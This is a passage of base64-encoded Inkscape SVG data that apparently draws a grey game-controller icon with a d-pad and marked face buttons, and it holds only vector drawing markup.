N2Zyt4bWw8L2RjOmZvcm1hdD48ZGM6dHlwZSByZGY6cmVzb3VyY2U9Imh0dHA6Ly9wdXJsLm9yZy9kYy9kY21pdHlwZS9TdGlsbEltYWdlIi8+PC9jYzpXb3JrPjwvcmRmOlJERj48L21ldGFkYXRhPjxnIGlua3NjYXBlOmxhYmVsPSJDYXBhIDEiIGlua3NjYXBlOmdyb3VwbW9kZT0ibGF5ZXIiIGlkPSJsYXllcjEiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAsLTU1Ni4yOTkyNSkiPjxnIGlkPSJnODQ2NyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoOC43NTkwNDQzLDQ5Ny42ODI4NCkiPjxwYXRoIGlkPSJwYXRoNDM2MCIgZD0ibTE3OS40IDExMC44IDAgMTIuNSAxNzcuNyAwIDMyLjEgMCAxODYuMyAwLjEgMC0xMi42LTM5Ni4xIDB6IiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBmaWxsPSIjOTI5Njk1Ii8+PGcgaWQ9Imc2ODYxIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMzIyLjA4NjEsODk4Ljc0NTM3KSI+PHBhdGggZD0ibS03NDAuNC04MjUuOGMyMS45LTEwLjggNDkuMi0xMC44IDcxLjEgMCAzLjMgMS42IDcuNiA0LjEgNy42IDkuMWwwIDcuN2MwIDUtMy40IDkuMS03LjYgOS4xbC03MS4xIDBjLTQuMiAwLTcuNi00LjEtNy42LTkuMWwwLTcuN2MwLTUgNC4zLTcuNSA3LjYtOS4xeiIgaWQ9InBhdGg2ODYzIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBzb2RpcG9kaTpub2RldHlwZXM9ImFhc3Nzc3NzYSIgZmlsbD0iIzJiMzIzNiIvPjxwYXRoIGQ9Im0tNzM5LjItODI1LjZjMjEuMi0xMC40IDQ3LjUtMTAuNCA2OC43IDAgMy4yIDEuNiA3LjQgMy45IDcuNCA4LjhsMCA3LjVjMCA0LjktMy4zIDguOC03LjQgOC44bC02OC43IDBjLTQuMSAwLTcuNC0zLjktNy40LTguOGwwLTcuNWMwLTQuOSA0LjItNy4yIDcuNC04Ljh6IiBpZD0icGF0aDY4NjUiIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIHNvZGlwb2RpOm5vZGV0eXBlcz0iYWFzc3Nzc3NhIiBjbGFzcz0iczgiLz48cGF0aCBkPSJtLTc1MS42LTgxMi4xYzAgMCAxOC4xLTEzLjQgNDUuOS0xMy41IDMwLjQtMC4yIDQ0LjQgMTMuNSA0NC40IDEzLjUgMy43IDIuOCA2LjkgMy45IDcuMyA4LjdsMy40IDM5LjNjMC40IDQuOC0zLjMgOC43LTcuMyA4LjdsLTk3LjEgMGMtNC4xIDAtNy43LTMuOS03LjMtOC43bDMuNC0zOS4zYzAuNC00LjggMi43LTUuOSA3LjMtOC43eiIgaWQ9InBhdGg2ODY3IiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBzb2RpcG9kaTpub2RldHlwZXM9InNzc3Nzc3Nzc3MiIGZpbGw9InVybCgjcmFkaWFsR3JhZGllbnQ3MDY5KSIvPjxwYXRoIHNvZGlwb2RpOm5vZGV0eXBlcz0iYWFzc3Nzc3NhIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBpZD0icGF0aDY4NjkiIGQ9Im0tNzM5LjUtODI1LjJjMjEuNC0xMC40IDQ4LjItMTAuNCA2OS42IDAgMy4zIDEuNiA3LjUgMy45IDcuNSA4LjhsMCA3LjVjMCA0LjktMy4zIDguOC03LjUgOC44bC02OS42IDBjLTQuMSAwLTcuNS0zLjktNy41LTguOGwwLTcuNWMwLTQuOSA0LjItNy4yIDcuNS04Ljh6IiBmaWxsPSIjMTcxYjFkIi8+PHBhdGggc29kaXBvZGk6bm9kZXR5cGVzPSJzc3Nzc3Nzc3NzIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBpZD0icGF0aDY4NzEiIGQ9Im0tNzUxLjYtODEwLjhjMCAwIDE4LjEtMTMuNCA0NS45LTEzLjUgMzAuNC0wLjIgNDQuNCAxMy41IDQ0LjQgMTMuNSAzLjcgMi44IDYuOSAzLjkgNy4zIDguN2wzLjQgMzkuM2MwLjQgNC44LTMuMyA4LjctNy4zIDguN2wtOTcuMSAwYy00LjEgMC03LjctMy45LTcuMy04LjdsMy40LTM5LjNjMC40LTQuOCAyLjctNS45IDcuMy04Ljd6IiBmaWxsPSIjY2NjZWNlIi8+PHBhdGggZD0ibS03NTEuNi04MDkuOWMwIDAgMTguMS0xMy40IDQ1LjktMTMuNSAzMC40LTAuMiA0NC40IDEzLjUgNDQuNCAxMy41IDMuNyAyLjggNi45IDMuOSA3LjMgOC43bDMuNCAzOS4zYzAuNCA0LjgtMy4zIDguNy03LjMgOC43bC05Ny4xIDBjLTQuMSAwLTcuNy0zLjktNy4zLTguN2wzLjQtMzkuM2MwLjQtNC44IDIuNy01LjkgNy4zLTguN3oiIGlkPSJwYXRoNjg3MyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgc29kaXBvZGk6bm9kZXR5cGVzPSJzc3Nzc3Nzc3NzIiBmaWxsPSIjOTI5Njk1Ii8+PC9nPjxwYXRoIGQ9Im0xNTcuMiAxMjMuMSAwIDE2NC4zTDUuMSAyMTYuNGMwIDAtMTEuNCAyMDIuNi0xMi4zIDIxMy44LTEgMTIgMC40IDg1LjkgNDQuNCAxMDcuOSA5Mi43IDQ2LjIgMTMzLjktNzkuMiAxMzMuOS03OS4yIDAgMCAzMi41LTcyIDU1LTEwNCA0LTUuNyA2LjctMTAuNiA5LjgtMTQuMiAxLjMtMS42IDMuNi0yLjQgNC44LTIuOSAzLjMtMS42IDguOS0yLjcgOC45LTIuNyA4My44IDIuNCAxNjIuOCAxLjcgMjQ3IDAgMCAwIDUuNyAxLjEgOC45IDIuNyAxLjYgMC44IDQuNSAyIDYuMSAzLjggMyAzLjQgNS41IDggOS4yIDEzLjMgMjIuNiAzMiA1NC43IDEwNC4xIDU0LjcgMTA0LjEgMCAwIDQxLjIgMTI1LjQgMTMzLjkgNzkuMiA0NC0yMS45IDQyLjktOTUuOSA0MS45LTEwOC0wLjktMTEuMi0xMC43LTIwNi44LTEwLjctMjA2LjhsLTE1MS45IDY0LjQgMC0xNjQuNi0xOTkuNi0wLjEtMzIuMSAweiIgaWQ9InBhdGg2ODc1IiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBzb2RpcG9kaTpub2RldHlwZXM9ImNjY3NzY3NzY2NjY3NzY3NzY2NjY2NjIiBmaWxsPSIjOTI5Njk1Ii8+PHBhdGggZD0ibTcwLjMgMjg5LjQgMCAyNTQuNGM2OS41IDYuMiAxMDAuOC04OS4xIDEwMC44LTg5LjEgMCAwIDMyLjUtNzIgNTUtMTA0IDQtNS43IDYuNy0xMC42IDkuOC0xNC4yIDEuMy0xLjYgMy42LTIuNCA0LjgtMi45IDMuMy0xLjYgOC45LTIuNyA4LjktMi43IDgzLjggMi40IDE2Mi44IDEuNyAyNDcgMCAwIDAgNS43IDEuMSA4LjkgMi43IDEuNiAwLjggNC41IDIgNi4xIDMuOCAzIDMuNCA1LjUgOCA5LjIgMTMuMyAyMi42IDMyIDU0LjcgMTA0LjEgNTQuNyAxMDQuMSAwIDAgNDEuMiAxMjUuNCAxMzMuOSA3OS4yIDEuMS0wLjYgMi4yLTEuMiAzLjMtMS44bDAtMjQyLjctNjQyLjUgMHoiIGlkPSJwYXRoNjg3OSIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgc3R5bGU9ImZpbGw6dXJsKCNyYWRpYWxHcmFkaWVudDcwNzMpO29wYWNpdHk6MSIvPjxwYXRoIGQ9Im0yMzkuOSAzMTYuOWM4OS44IDUuNyAxNzguNyAyLjIgMjYzLjItMC43IDEuOS0wLjEgNC4xLTAuNSA1LjItMy40IDAuMS0wLjIgMC4xLTAuNCAwLjItMC42IDAuNi0zLjEtMi4yLTguOS0yLjktMTIuNS0wLjgtMy45LTIuNS0xMC42LTIuNS0xMC42bC0yNTEuOS0zLjhjMCAwLTE1LjkgMTMuNi0xOC4zIDIzLjMtMC41IDEuOS0wLjIgNC4yIDAuNyA1LjggMC43IDEuMiA0LjIgMi41IDYuNCAyLjZ6IiBpZD0icGF0aDY4ODEiIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIHNvZGlwb2RpOm5vZGV0eXBlcz0ic3Nzc3NjY3NzcyIgc3R5bGU9ImZpbGw6dXJsKCNsaW5lYXJHcmFkaWVudDcwNzUpO29wYWNpdHk6MCIvPjxwYXRoIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIGQ9Im0xNzkuNCAxMTAuOCAwIDEyLjUgMTc3LjcgMCAzMi4xIDAgMTg2LjMgMC4xIDAtMTIuNi0zOTYuMSAweiIgaWQ9InBhdGg2ODc3IiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50NzA3MSkiLz48cGF0aCBkPSJtLTU3Ny40LTY2OC4xYTEyMy42IDEyNC42IDAgMCAxLTEyMy42IDEyNC42IDEyMy42IDEyNC42IDAgMCAxLTEyMy42LTEyNC42IDEyMy42IDEyNC42IDAgMCAxIDEyMy42LTEyNC42IDEyMy42IDEyNC42IDAgMCAxIDEyMy42IDEyNC42eiIgaWQ9InBhdGg2ODgzIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSwwLDAsMSwtOTMuNjM1NTEzLDg5OS44MTU1MykiIHN0eWxlPSJmaWxsOnVybCgjcmFkaWFsR3JhZGllbnQ3MDc3KTtmaWx0ZXI6dXJsKCNmaWx0ZXI2NzA3KSIvPjxwYXRoIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIGlkPSJwYXRoNjg4NSIgZD0iTTI2MS4zIDIzMS43QTEyMy42IDEyNC42IDAgMCAxIDEzNy43IDM1Ni4zIDEyMy42IDEyNC42IDAgMCAxIDE0IDIzMS43IDEyMy42IDEyNC42IDAgMCAxIDEzNy43IDEwNy4xIDEyMy42IDEyNC42IDAgMCAxIDI2MS4zIDIzMS43WiIgc3R5bGU9ImZpbGw6dXJsKCNyYWRpYWxHcmFkaWVudDcwNzkpO2ZpbHRlcjp1cmwoI2ZpbHRlcjY3MDcpIi8+PHBhdGggZD0ibTEyLjcgMzAxYzAgMC0yMi41IDEzOS41LTEzLjUgMTQ0LjkgOSA1LjQgMzMuMyA4NC4xIDM3LjggODguNiA0LjUgNC41IDI0LjkgMjQuMSA3MiA3LjIgNDcuMS0xNi45IDE0My4xLTIzNi4yIDE0My4xLTIzNi4yTDMxLjYgMjc1LjlaIiBpZD0icGF0aDY4ODciIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIHNvZGlwb2RpOm5vZGV0eXBlcz0iY3NzemNjYyIgZmlsbD0idXJsKCNsaW5lYXJHcmFkaWVudDcwODEpIi8+PHJlY3QgaWQ9InJlY3Q2ODg5IiB3aWR0aD0iMzc0LjgiIGhlaWdodD0iMjAuMiIgeD0iMjAwLjciIHk9IjEyMy4yIiBzdHlsZT0iZmlsbDp1cmwoI2xpbmVhckdyYWRpZW50NzA4Myk7b3BhY2l0eToxIi8+PHBhdGggaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgaWQ9InBhdGg2ODkxIiBkPSJNMjU3LjUgMjI3QTEyNi41IDEyNy41IDAgMCAxIDEzMSAzNTQuNiAxMjYuNSAxMjcuNSAwIDAgMSA0LjUgMjI3IDEyNi41IDEyNy41IDAgMCAxIDEzMSA5OS41IDEyNi41IDEyNy41IDAgMCAxIDI1Ny41IDIyN1oiIGZpbGw9IiM5Mjk2OTUiLz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSg4MzguNzIwMzUsODk5LjgxNTUzKSIgaWQ9Imc2ODkzIj48cGF0aCBzb2RpcG9kaTpub2RldHlwZXM9ImFhc3Nzc3NzYSIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgaWQ9InBhdGg2ODk1IiBkPSJtLTc0MC40LTgyNS44YzIxLjktMTAuOCA0OS4yLTEwLjggNzEuMSAwIDMuMyAxLjYgNy42IDQuMSA3LjYgOS4xbDAgNy43YzAgNS0zLjQgOS4xLTcuNiA5LjFsLTcxLjEgMGMtNC4yIDAtNy42LTQuMS03LjYtOS4xbDAtNy43YzAtNSA0LjMtNy41IDcuNi05LjF6IiBmaWxsPSIjMmIzMjM2Ii8+PHBhdGggc29kaXBvZGk6bm9kZXR5cGVzPSJhYXNzc3Nzc2EiIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIGlkPSJwYXRoNjg5NyIgZD0ibS03MzkuMi04MjUuNmMyMS4yLTEwLjQgNDcuNS0xMC40IDY4LjcgMCAzLjIgMS42IDcuNCAzLjkgNy40IDguOGwwIDcuNWMwIDQuOS0zLjMgOC44LTcuNCA4LjhsLTY4LjcgMGMtNC4xIDAtNy40LTMuOS03LjQtOC44bDAtNy41YzAtNC45IDQuMi03LjIgNy40LTguOHoiIGNsYXNzPSJzOCIvPjxwYXRoIHNvZGlwb2RpOm5vZGV0eXBlcz0ic3Nzc3Nzc3NzcyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgaWQ9InBhdGg2ODk5IiBkPSJtLTc1MS42LTgxMi4xYzAgMCAxOC4xLTEzLjQgNDUuOS0xMy41IDMwLjQtMC4yIDQ0LjQgMTMuNSA0NC40IDEzLjUgMy43IDIuOCA2LjkgMy45IDcuMyA4LjdsMy40IDM5LjNjMC40IDQuOC0zLjMgOC43LTcuMyA4LjdsLTk3LjEgMGMtNC4xIDAtNy43LTMuOS03LjMtOC43bDMuNC0zOS4zYzAuNC00LjggMi43LTUuOSA3LjMtOC43eiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDcwODUpIi8+PHBhdGggZD0ibS03MzkuNS04MjUuMmMyMS40LTEwLjQgNDguMi0xMC40IDY5LjYgMCAzLjMgMS42IDcuNSAzLjkgNy41IDguOGwwIDcuNWMwIDQuOS0zLjMgOC44LTcuNSA4LjhsLTY5LjYgMGMtNC4xIDAtNy41LTMuOS03LjUtOC44bDAtNy41YzAtNC45IDQuMi03LjIgNy41LTguOHoiIGlkPSJwYXRoNjkwMSIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgc29kaXBvZGk6bm9kZXR5cGVzPSJhYXNzc3Nzc2EiIGZpbGw9IiMxNzFiMWQiLz48cGF0aCBkPSJtLTc1MS42LTgxMC44YzAgMCAxOC4xLTEzLjQgNDUuOS0xMy41IDMwLjQtMC4yIDQ0LjQgMTMuNSA0NC40IDEzLjUgMy43IDIuOCA2LjkgMy45IDcuMyA4LjdsMy40IDM5LjNjMC40IDQuOC0zLjMgOC43LTcuMyA4LjdsLTk3LjEgMGMtNC4xIDAtNy43LTMuOS03LjMtOC43bDMuNC0zOS4zYzAuNC00LjggMi43LTUuOSA3LjMtOC43eiIgaWQ9InBhdGg2OTAzIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBzb2RpcG9kaTpub2RldHlwZXM9InNzc3Nzc3Nzc3MiIGZpbGw9IiNjY2NlY2UiLz48cGF0aCBzb2RpcG9kaTpub2RldHlwZXM9InNzc3Nzc3Nzc3MiIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIGlkPSJwYXRoNjkwNSIgZD0ibS03NTEuNi04MDkuOWMwIDAgMTguMS0xMy40IDQ1LjktMTMuNSAzMC40LTAuMiA0NC40IDEzLjUgNDQuNCAxMy41IDMuNyAyLjggNi45IDMuOSA3LjMgOC43bDMuNCAzOS4zYzAuNCA0LjgtMy4zIDguNy03LjMgOC43bC05Ny4xIDBjLTQuMSAwLTcuNy0zLjktNy4zLTguN2wzLjQtMzkuM2MwLjQtNC44IDIuNy01LjkgNy4zLTguN3oiIGZpbGw9IiM5Mjk2OTUiLz48L2c+PHBhdGggZD0iTTI1Ny41IDIyOEExMjcuNSAxMjcuNSAwIDAgMSAxMzAgMzU1LjUgMTI3LjUgMTI3LjUgMCAwIDEgMi40IDIyOCAxMjcuNSAxMjcuNSAwIDAgMSAxMzAgMTAwLjUgMTI3LjUgMTI3LjUgMCAwIDEgMjU3LjUgMjI4WiIgaWQ9InBhdGg2OTA3IiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50NzA4NykiLz48cmVjdCBpZD0icmVjdDY5MDkiIHdpZHRoPSIzNzQuOCIgaGVpZ2h0PSIxLjkiIHg9IjE4Mi4xIiB5PSIxMjIuNSIgc3R5bGU9ImZpbGw6I2Y5ZjlmOTtmaWx0ZXI6dXJsKCNmaWx0ZXI2ODQ2KTtvcGFjaXR5OjAiLz48cGF0aCBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBpZD0icGF0aDY5MTEiIGQ9Ik0xNjMuNCAzNTAuM0ExMjcuOSAxMjcuMSAwIDAgMSA2LjggMjYwLjQgMTI3LjkgMTI3LjEgMCAwIDEgOTcuMiAxMDQuOCAxMjcuOSAxMjcuMSAwIDAgMSAyNTMuOCAxOTQuNiAxMjcuOSAxMjcuMSAwIDAgMSAxNjMuNCAzNTAuM1oiIGZpbGw9InVybCgjbGluZWFyR3JhZGllbnQ3MDg5KSIvPjxwYXRoIGQ9Ik0yNTcuNSAyMjcuOUExMjUuNiAxMjYuNSAwIDAgMSAxMzIgMzU0LjQgMTI1LjYgMTI2LjUgMCAwIDEgNi40IDIyNy45IDEyNS42IDEyNi41IDAgMCAxIDEzMiAxMDEuNCAxMjUuNiAxMjYuNSAwIDAgMSAyNTcuNSAyMjcuOVoiIGlkPSJwYXRoNjkxMyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgZmlsbD0iIzkyOTY5NSIvPjxwYXRoIHNvZGlwb2RpOm5vZGV0eXBlcz0iY3NzemNjYyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgaWQ9InBhdGg2OTE1IiBkPSJtNzM0IDMwMWMwIDAgMjIuNSAxMzkuNSAxMy41IDE0NC45LTkgNS40LTMzLjMgODQuMS0zNy44IDg4LjYtNC41IDQuNS0yNC45IDI0LjEtNzIgNy4yQzU5MC43IDUyNC44IDQ5NC43IDMwNS41IDQ5NC43IDMwNS41bDIyMC41LTI5Ljd6IiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50NzA5MSkiLz48ZyBpZD0iZzY5MTciIHRyYW5zZm9ybT0ibWF0cml4KC0xLDAsMCwxLDY3Mi40MTQwNiw5MDEuNjE1MTMpIj48cGF0aCBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBpZD0icGF0aDY5MTkiIGQ9Ik0xODQuNS02NzIuOEExMjYuNSAxMjcuNSAwIDAgMSA1OC01NDUuMiAxMjYuNSAxMjcuNSAwIDAgMS02OC41LTY3Mi44IDEyNi41IDEyNy41IDAgMCAxIDU4LTgwMC4zIDEyNi41IDEyNy41IDAgMCAxIDE4NC41LTY3Mi44WiIgZmlsbD0iIzkyOTY5NSIvPjxwYXRoIGQ9Ik0xODQuNS02NzEuOEExMjcuNSAxMjcuNSAwIDAgMSA1Ny01NDQuMyAxMjcuNSAxMjcuNSAwIDAgMS03MC41LTY3MS44IDEyNy41IDEyNy41IDAgMCAxIDU3LTc5OS40IDEyNy41IDEyNy41IDAgMCAxIDE4NC41LTY3MS44WiIgaWQ9InBhdGg2OTIxIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50NzA5MykiLz48cGF0aCBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBpZD0icGF0aDY5MjMiIGQ9Im05MC40LTU0OS4zYTEyNy45IDEyNy4yIDAgMCAxLTE1Ni42LTg5LjkgMTI3LjkgMTI3LjIgMCAwIDEgOTAuNC0xNTUuOCAxMjcuOSAxMjcuMiAwIDAgMSAxNTYuNiA4OS45IDEyNy45IDEyNy4yIDAgMCAxLTkwLjQgMTU1Ljh6IiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50NzA5NSkiLz48cGF0aCBkPSJNMTg0LjUtNjcxLjlBMTI1LjYgMTI2LjUgMCAwIDEgNTktNTQ1LjQgMTI1LjYgMTI2LjUgMCAwIDEtNjYuNi02NzEuOSAxMjUuNiAxMjYuNSAwIDAgMSA1OS03OTguNCAxMjUuNiAxMjYuNSAwIDAgMSAxODQuNS02NzEuOVoiIGlkPSJwYXRoNjkyNSIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgZmlsbD0iIzkyOTY5NSIvPjwvZz48cGF0aCBpZD0icGF0aDY5MjciIGQ9Im01ODguOCAxNDAuMWMtNC44IDAtOC43IDMuOS04LjcgOC43bDAgNTAuMy01MC4zIDBjLTQuOCAwLTguNyAzLjktOC43IDguN2wwIDUwLjdjMCA0LjggMy45IDguNyA4LjcgOC43bDUwLjMgMCAwIDUwLjNjMCA0LjggMy45IDguNyA4LjcgOC43bDUwLjcgMGM0LjggMCA4LjctMy45IDguNy04LjdsMC01MC4zIDUwLjMgMGM0LjggMCA4LjctMy45IDguNy04LjdsMC01MC43YzAtNC44LTMuOS04LjctOC43LTguN2wtNTAuMyAwIDAtNTAuM2MwLTQuOC0zLjktOC43LTguNy04LjdsLTUwLjcgMHoiIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIGNsYXNzPSJzMTEiLz48ZWxsaXBzZSBpZD0iZWxsaXBzZTY5MjkiIHJ5PSI2NC4zIiByeD0iMTA1LjYiIGN5PSIxOTIuMyIgY3g9IjYwOS43IiBmaWxsPSIjOTI5Njk1Ii8+PHBhdGggaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgZD0ibTU4OS4zIDEzOS45Yy00LjggMC04LjcgMy45LTguNyA4LjdsMCA1MC4zLTUwLjMgMGMtNC44IDAtOC43IDMuOS04LjcgOC43bDAgNTAuN2MwIDQuOCAzLjkgOC43IDguNyA4LjdsNTAuMyAwIDAgNTAuM2MwIDQuOCAzLjkgOC43IDguNyA4LjdsNTAuNyAwYzQuOCAwIDguNy0zLjkgOC43LTguN2wwLTUwLjMgNTAuMyAwYzQuOCAwIDguNy0zLjkgOC43LTguN2wwLTUwLjdjMC00LjgtMy45LTguNy04LjctOC43bC01MC4zIDAgMC01MC4zYzAtNC44LTMuOS04LjctOC43LTguN2wtNTAuNyAweiIgaWQ9InBhdGg2OTMxIiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50NzA5NykiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLjE1MDE2MSwwLDAsMS4xNTAxNjEsODcwLjEwODQ2LDk5NC45NjQ1NikiIGlkPSJnNjkzMyI+PGNpcmNsZSByPSIyMi4xIiBjeT0iLTIyNCIgY3g9IjYwOC4xIiBpZD0iY2lyY2xlNjkzNSIgdHJhbnNmb3JtPSJtYXRyaXgoMCwtMSwxLDAsMCwwKSIgZmlsbD0iI2Y5ZjlmOSIvPjxjaXJjbGUgdHJhbnNmb3JtPSJtYXRyaXgoMCwtMSwxLDAsMCwwKSIgaWQ9ImNpcmNsZTY5MzciIGN4PSI2MDcuMiIgY3k9Ii0yMjQiIHI9IjIyLjEiIGZpbGw9InVybCgjbGluZWFyR3JhZGllbnQ3MDk5KSIvPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDI4LjM0NjYyOSwwLjAwNDk2Nzg1KSIgaWQ9Imc2OTM5Ij48cGF0aCBkPSJtLTI2Mi44LTYxNy42IDIwLjkgMjAuOU0tMjQxLjktNjE3LjZsLTIwLjkgMjAuOU0tMjQxLjktNjE3LjZsLTIwLjkgMjAuOU0tMjQxLjktNjE3LjZsLTIwLjkgMjAuOSIgaWQ9InBhdGg2OTQxIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBjbGFzcz0iczEzIi8+PC9nPjwvZz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLjE1OTg5NDQsMCwwLDEuMTU5ODk0NCw4ODQuNzI1ODEsMTAxMi43MTczKSIgaWQ9Imc2OTQ1Ij48Y2lyY2xlIGlkPSJjaXJjbGU2OTQ3IiBjeD0iLTI4Ni42IiBjeT0iLTY3MC43IiByPSIyMi4xIiBmaWxsPSIjZjlmOWY5Ii8+PGNpcmNsZSByPSIyMi4xIiBjeT0iLTY2OS44IiBjeD0iLTI4Ni42IiBpZD0iY2lyY2xlNjk0OSIgZmlsbD0idXJsKCNsaW5lYXJHcmFkaWVudDcxMDEpIi8+PHJlY3QgeT0iLTY4MC4zIiB4PSItMjk3LjEiIGhlaWdodD0iMjAuOSIgd2lkdGg9IjIwLjkiIGlkPSJyZWN0Njk1MSIgc3R5bGU9ImZpbGw6bm9uZTtzdHJva2UtbGluZWpvaW46cm91bmQ7c3Ryb2tlOiNjZjhlYWQiLz48L2c+PGcgdHJhbnNmb3JtPSJtYXRyaXgoMS4xNDc0MDI3LDAsMCwxLjE0NzQwMjcsODY5LjQ5MDY5LDEwMTUuNjY4KSIgaWQ9Imc2OTUzIj48Y2lyY2xlIGlkPSJjaXJjbGU2OTU1IiBjeD0iNzMzLjUiIGN5PSItMjI0IiByPSIyMi4xIiB0cmFuc2Zvcm09Im1hdHJpeCgwLC0xLDEsMCwwLDApIiBmaWxsPSIjZjlmOWY5Ii8+PGNpcmNsZSB0cmFuc2Zvcm09Im1hdHJpeCgwLC0xLDEsMCwwLDApIiByPSIyMi4xIiBjeT0iLTIyNCIgY3g9IjczMi41IiBpZD0iY2lyY2xlNjk1NyIgZmlsbD0idXJsKCNsaW5lYXJHcmFkaWVudDcxMDMpIi8+PHBhdGggdHJhbnNmb3JtPSJtYXRyaXgoMS4wOTE0MTQsMCwwLDEuMjE5ODUyMSwtMTguNzczMDgzLDg1LjE5Nzg3KSIgaW5rc2NhcGU6dHJhbnNmb3JtLWNlbnRlci15PSItMy43IiBkPSJtLTE3Ny40LTY2Mi4xLTIxLjIgMCAxMC42LTE4LjR6IiBpbmtzY2FwZTpyYW5kb21pemVkPSIwIiBpbmtzY2FwZTpyb3VuZGVkPSIwIiBpbmtzY2FwZTpmbGF0c2lkZWQ9InRydWUiIHNvZGlwb2RpOmFyZzI9IjEuNiIgc29kaXBvZGk6YXJnMT0iMC41IiBzb2RpcG9kaTpyMj0iNi4xIiBzb2RpcG9kaTpyMT0iMTIuMiIgc29kaXBvZGk6Y3k9Ii02NjguMiIgc29kaXBvZGk6Y3g9Ii0xODgiIHNvZGlwb2RpOnNpZGVzPSIzIiBpZD0icGF0aDY5NTkiIHNvZGlwb2RpOnR5cGU9InN0YXIiIHN0eWxlPSJmaWxsOm5vbmU7c3Ryb2tlLWxpbmVqb2luOnJvdW5kO3N0cm9rZS13aWR0aDoxO3N0cm9rZTojMTQ5NzhlIi8+PC9nPjxnIHRyYW5zZm9ybT0ibWF0cml4KDEuMTM5OTA3NiwwLDAsMS4xMzk5MDc2LDg1Ni44ODQzNSwxMDAwLjM0MTQpIiBpZD0iZzY5NjEiPjxjaXJjbGUgcj0iMjIuMSIgY3k9Ii02NzAuNiIgY3g9Ii0xNjEuMiIgaWQ9ImNpcmNsZTY5NjMiIGZpbGw9IiNmOWY5ZjkiLz48Y2lyY2xlIGlkPSJjaXJjbGU2OTY1IiBjeD0iLTE2MS4zIiBjeT0iLTY2OS44IiByPSIyMi4xIiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50NzEwNSkiLz48Y2lyY2xlIHI9IjEzLjMiIGN5PSItNjY5LjgiIGN4PSItMTYxLjMiIGlkPSJjaXJjbGU2OTY3IiBzdHlsZT0iZmlsbDpub25lO3N0cm9rZS1saW5lam9pbjpyb3VuZDtzdHJva2Utd2lkdGg6MTtzdHJva2U6I2E0NzU3NyIvPjwvZz48ZyBpZD0iZzY5NjkiIHRyYW5zZm9ybT0ibWF0cml4KDAuNjA2MDg3NDEsMCwwLDAuNjA2MDg3NDEsNjYwLjE1MzA3LDY1Mi4xOTg4MikiPjxwYXRoIHNvZGlwb2RpOm5vZGV0eXBlcz0iY2NzY2NzYyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgaWQ9InBhdGg2OTcxIiBkPSJtLTQ4OC40LTY4OS45IDAgNi4xYzAgMC0yNC44IDIuMy0yNC44LTYuMSAwLTUuNCAyNC44LTExLjUgMjQuOC0xMS41bDAgNy4xYzAgMC0xMy43IDMuNy0xMy43IDUuNCAwLjEgNC4xIDEzLjctMSAxMy43LTF6TS00NjkuNi02OTYuNmwwIDcuMk0tNDY5LjYtNjk2LjZsMCA3LjJNLTQ2OS42LTY5Ni42bDAgNy4yYzAgMCAxNy44LTcuNCAyMC42LTQuNCAxIDEuMS0wLjcgMi4yLTYuMSAzLjctNi40IDEuOC0xNC43IDUuNC0xNC43IDUuNGwwIDcuMWMwIDAgOS42LTMuNiAxOC43LTYuN